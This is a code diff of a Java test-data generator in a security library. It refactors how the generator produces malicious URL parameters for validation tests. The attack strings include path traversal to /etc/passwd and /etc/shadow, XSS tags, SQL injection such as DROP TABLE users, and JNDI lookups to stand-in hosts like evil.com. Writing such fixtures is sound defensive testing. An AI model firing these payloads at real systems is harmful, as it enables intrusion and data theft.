@@ -22,6 +22,8 @@ import de.cuioss.tools.security.http.data.URLParameter;
 /**
  * Generates malicious URLParameter records for testing security validation.
  * 
+ * <p>QI-6: Converted from fixedValues() to dynamic algorithmic generation.</p>
+ * 
  * This generator produces only attack patterns and malicious URL parameter data that should be
  * rejected by security validation systems. It complements ValidURLParameterGenerator
  * which generates legitimate patterns.
@@ -33,14 +35,14 @@ import de.cuioss.tools.security.http.data.URLParameter;
  */
 public class AttackURLParameterGenerator implements TypedGenerator<URLParameter> {
 
-    // Core generation parameters - all seed-based, no internal state
+    // Core generation parameters - all seed-based, no internal state - QI-6: Converted from fixedValues() to dynamic generation
     private final TypedGenerator<Integer> attackTypeGenerator = Generators.integers(0, 3);
-    private final TypedGenerator<String> systemPaths = Generators.fixedValues("etc/passwd", "windows/win.ini", "root");
-    private final TypedGenerator<String> scriptTags = Generators.fixedValues("script", "img", "iframe", "style");
-    private final TypedGenerator<String> sqlCommands = Generators.fixedValues("DROP TABLE", "DELETE FROM", "INSERT INTO");
-    private final TypedGenerator<String> tableNames = Generators.fixedValues("users", "admin", "accounts", "sessions");
-    private final TypedGenerator<String> maliciousDomains = Generators.fixedValues("evil.com", "attacker.net", "malicious.org");
-    private final TypedGenerator<String> protocolSchemes = Generators.fixedValues("javascript", "file", "data");
+    private final TypedGenerator<Integer> systemPathSelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> scriptTagSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> sqlCommandSelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> tableNameSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> maliciousDomainSelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> protocolSchemeSelector = Generators.integers(1, 3);
     private final TypedGenerator<Boolean> contextSelector = Generators.booleans();
     private final TypedGenerator<Integer> mediumStringSize = Generators.integers(10, 30);
     private final TypedGenerator<Integer> longStringSize = Generators.integers(100, 200);
@@ -129,12 +131,12 @@ public class AttackURLParameterGenerator implements TypedGenerator<URLParameter>
         for (int i = 0; i < depth; i++) {
             path.append("../");
         }
-        path.append(systemPaths.next());
+        path.append(generateSystemPath());
         return path.toString();
     }
 
     private String generateXSSAttack() {
-        String tag = scriptTags.next();
+        String tag = generateScriptTag();
         int payloadType = Generators.integers(0, 2).next();
         String payload = switch (payloadType) {
             case 0 -> "alert('xss')";
@@ -146,8 +148,8 @@ public class AttackURLParameterGenerator implements TypedGenerator<URLParameter>
     }
 
     private String generateSQLInjectionAttack() {
-        String command = sqlCommands.next();
-        String table = tableNames.next();
+        String command = generateSQLCommand();
+        String table = generateTableName();
         return "'; " + command + " " + table + "; --";
     }
 
@@ -161,12 +163,12 @@ public class AttackURLParameterGenerator implements TypedGenerator<URLParameter>
     }
 
     private String generateJNDIAttack() {
-        String domain = maliciousDomains.next();
+        String domain = generateMaliciousDomain();
         return "${jndi:ldap://" + domain + "/}";
     }
 
     private String generateProtocolAttack() {
-        String protocol = protocolSchemes.next();
+        String protocol = generateProtocolScheme();
         String payload = switch (protocol) {
             case "javascript" -> "alert(1)";
             case "file" -> "///etc/passwd";
@@ -193,6 +195,70 @@ public class AttackURLParameterGenerator implements TypedGenerator<URLParameter>
             case 1 -> "..\\..\\windows\\system32";
             case 2 -> "/etc/shadow";
             default -> "../../../root";
+        };
+    }
+
+    // QI-6: Dynamic generation helper methods
+    private String generateSystemPath() {
+        return switch (systemPathSelector.next()) {
+            case 1 -> "etc/passwd";
+            case 2 -> "windows/win.ini";
+            case 3 -> "root";
+            default -> "etc/passwd";
+        };
+    }
+
+    private String generateScriptTag() {
+        return switch (scriptTagSelector.next()) {
+            case 1 -> "script";
+            case 2 -> "img";
+            case 3 -> "iframe";
+            case 4 -> "style";
+            default -> "script";
+        };
+    }
+
+    private String generateSQLCommand() {
+        return switch (sqlCommandSelector.next()) {
+            case 1 -> "DROP TABLE";
+            case 2 -> "DELETE FROM";
+            case 3 -> "INSERT INTO";
+            default -> "DROP TABLE";
+        };
+    }
+
+    private String generateTableName() {
+        return switch (tableNameSelector.next()) {
+            case 1 -> "users";
+            case 2 -> "admin";
+            case 3 -> "accounts";
+            case 4 -> "sessions";
+            default -> "users";
+        };
+    }
+
+    private String generateMaliciousDomain() {
+        String domain = switch (maliciousDomainSelector.next()) {
+            case 1 -> "evil";
+            case 2 -> "attacker";
+            case 3 -> "malicious";
+            default -> "evil";
+        };
+        String tld = switch (Generators.integers(1, 3).next()) {
+            case 1 -> "com";
+            case 2 -> "net";
+            case 3 -> "org";
+            default -> "com";
+        };
+        return domain + "." + tld;
+    }
+
+    private String generateProtocolScheme() {
+        return switch (protocolSchemeSelector.next()) {
+            case 1 -> "javascript";
+            case 2 -> "file";
+            case 3 -> "data";
+            default -> "javascript";
         };
     }
 
